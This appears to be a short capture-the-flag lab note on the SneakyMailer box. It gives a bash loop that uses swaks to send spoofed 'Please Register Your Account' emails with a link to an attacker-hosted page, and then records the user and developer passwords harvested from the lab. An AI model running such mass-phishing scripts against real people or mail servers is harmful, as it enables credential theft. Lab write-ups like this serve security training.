# Phishing Users

## Using swaks (Swaks - Swiss Army Knife SMTP, the all-purpose SMTP transaction tester)

```bash
$ cat phish.sh 
for email in $(cat emails);
do
    swaks \
      --from support@sneakymailer.htb \
      --to $email \
      --header 'Subject: Please Register Your Account' \
      --body 'http://10.10.14.21/register.php' \
      --server 10.10.10.197 
done
```

```bash
bash phish.sh
```

![[Pasted image 20211213224146.png]]

![[Pasted image 20211213224324.png]]

paulbyrd@sneakymailer.htb
user:paulbyrd
`pass: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht


### Login with Evolution
![[Pasted image 20211213233025.png]]
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C